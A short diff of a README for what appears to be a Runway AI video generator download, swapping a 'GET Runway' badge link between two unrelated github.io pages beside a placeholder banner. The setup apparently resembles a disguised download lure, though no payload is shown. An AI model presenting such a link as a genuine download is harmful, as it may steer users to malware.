@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=fe9d59bd38d8afaee483ea100b754d638b89b880-5886630-images-thumbs&n=13)
 
-[![GET Runway](https://img.shields.io/badge/GET%20%E2%80%94%20Runway-0078D6?style=for-the-badge&logoColor=white)](https://backup-and-restore-toolkit.github.io/.github/runway-ai-video-generator)
+[![GET Runway](https://img.shields.io/badge/GET%20%E2%80%94%20Runway-0078D6?style=for-the-badge&logoColor=white)](https://virtual-machine-monitor-suite.github.io/.github/runway-ai-video-generator)
 
 ---
 
